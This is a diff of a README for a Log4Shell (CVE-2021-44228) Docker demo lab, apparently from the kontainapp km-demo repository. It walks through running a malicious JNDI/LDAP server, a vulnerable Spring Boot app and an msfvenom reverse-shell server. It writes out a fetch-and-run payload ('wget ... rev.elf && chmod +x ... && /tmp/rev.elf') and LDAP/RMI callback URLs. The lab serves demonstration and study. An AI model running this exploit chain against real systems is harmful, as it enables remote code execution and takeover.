@@ -2,33 +2,19 @@
 
 [https://www.reposhub.com/java/web-frameworks/twseptian-Spring-Boot-Log4j-CVE-2021-44228-Docker-Lab.html](https://www.reposhub.com/java/web-frameworks/twseptian-Spring-Boot-Log4j-CVE-2021-44228-Docker-Lab.html)
 
-### vagrant
-
-```bash
-cd /home/smijar/dev/vagrant/fedora34/
-vagrant ssh
-```
-
-**vagrant box:**
-
-```bash
 ensure that java and mvn are installed prior to this
-$ vagrant ssh
-```
 
 **clone:**
 
 ```bash
 # steps to checkout
-mkdir /vagrant
-cd /vagrant
-git clone https://github.com/kontainapp/km-demo.git
-cd km-demo
+$ git clone https://github.com/kontainapp/km-demo.git
+$ cd km-demo
 
-git submodule update --init --recursive
-git fetch origin
+$ git submodule update --init --recursive
+$ git fetch origin
 
-git checkout -t origin/sm/demo_log4jshell
+$ git checkout -t origin/sm/demo_log4jshell
 
 # 1-liner
 # git clone https://github.com/kontainapp/km-demo.git && cd km-demo && git submodule update --init --recursive && git fetch origin && git checkout -t origin/sm/demo_log4jshell
@@ -38,32 +24,35 @@ git checkout -t origin/sm/demo_log4jshell
 
 ```bash
 # build
-cd /vagrant/km-demo/log4j/
-make demo
+$ cd km-demo/log4j/
+$ make demo
 ```
 
 ### **Terminal 1 (Malicious LDAP server):**
 
 ```bash
 # T1 - Malicious LDAP Server triggers "wget http://127.0.0.1:8081/rev.elf -O /tmp/rev.elf && chmod +x /tmp/rev.elf && /tmp/rev.elf"
-cd /vagrant/km-demo/log4j/JNDI-Exploit-Kit/
+$ cd km-demo/log4j/JNDI-Exploit-Kit/
 
 # run with docker
-**docker run --network=host --rm log4jshell/jndi_exploit_kit**
+$ docker run --network=host --rm log4jshell/jndi_exploit_kit**
+
+OR
+
+$ cd scripts
+$ ./t1LdapJNDIExploit.sh
 
 OR
 
 # java jar based run - but could be jdk version issue
-**java -jar ./target/JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "wget http://127.0.0.1:8081/rev.elf -O /tmp/rev.elf && chmod +x /tmp/rev.elf && /tmp/rev.elf"**
+$ java -jar ./target/JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "wget http://127.0.0.1:8081/rev.elf -O /tmp/rev.elf && chmod +x /tmp/rev.elf && /tmp/rev.elf"
 ...
->> wget http://127.0.0.1:8081/rev.elf -O /tmp/rev.elf && chmod +x /tmp/rev.elf && /tmp/rev.elf
+... wget http://127.0.0.1:8081/rev.elf -O /tmp/rev.elf && chmod +x /tmp/rev.elf && /tmp/rev.elf
 ...
 Target environment(Build in JDK 1.6 whose trustURLCodebase is true):
 **rmi://10.100.101.100:1099/7p5qra
 ldap://10.100.101.100:1389/7p5qra
 
-OR RUN with:**
-$ ./t1LdapJNDIExploit.sh
 ```
 
 ### **Terminal 2 (Victim)**:
@@ -73,7 +62,7 @@ the vulnerable log4j application
 ```bash
 # T2 - Spring Boot Application Victim that contains a logging line that logs the header with the malicious LDAP string
 # runs "java -jar ./target/JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar" in docker for ease of use
-cd /vagrant/km-demo/log4j/
+cd km-demo/log4j/
 docker run --rm --network=host vulnerable-app
 ...
 
@@ -97,7 +86,7 @@ dial back (`rev.elf`) server (Terminal 3)
 ```bash
 
 # T3 - Malware server that contains exploits like creating a reverse shell to hackers computer
-$ cd /vagrant/km-demo/log4j/
+$ cd km-demo/log4j/
 
 $ cat msfvenom.sh
 docker run --name=msfvenom log4jshell/msfvenom
